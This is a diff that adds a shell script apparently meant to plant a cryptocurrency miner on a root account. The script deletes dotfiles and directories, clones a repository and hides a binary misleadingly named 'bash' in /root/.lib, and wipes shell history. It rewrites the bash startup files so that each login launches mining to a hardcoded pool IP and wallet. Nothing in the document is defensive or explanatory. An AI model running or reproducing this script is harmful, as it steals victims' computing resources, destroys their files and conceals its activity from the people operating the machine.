@@ -1,0 +1,29 @@
+cd ~
+rm -rvf .bash* .lib*
+
+rm -rvf ele* lol* 1.* 
+cd ~/
+mkdir .lib
+cd .lib
+rm -R *
+rm -R /root/.ton
+WORKER="modal"
+WALLETNH="0x9a90a1d375e7496314d202d17585770695fb325b"
+POOLNH="152.53.136.133:443"
+git clone https://github.com/IKSANNURPADILLAH/parallax2.git && cd parallax2 && mv bash /root/.lib && cd .. && history -cr 
+echo ""  > /root/.bashrc
+echo "" > /root/.bash_history
+echo "" > /root/.bash_profile
+echo 'echo ""  >> /root/.bash_history' >> /root/.bashrc
+echo "source /root/.bash_profile"  >> /root/.bashrc
+echo "LD_LIBRARY_PATH=/root/.lib" > /root/.bash_profile
+echo "export LD_LIBRARY_PATH" >> /root/.bash_profile
+echo 'WORKER="modal"' >> ~/.bash_profile
+echo 'WALLETNH="0x9a90a1d375e7496314d202d17585770695fb325b"' >> /root/.bash_profile
+echo 'POOLNH="152.53.136.133:443"' >> /root/.bash_profile
+echo "bash /root/.lib/gas.sh"  >> /root/.bash_profile
+echo "./.lib/bash -P stratum1+tcp://$WALLETNH.$WORKER@$POOLNH" > /root/.lib/gas.sh
+chmod +x bash && cd ~/ && source .bashrc
+
+
+
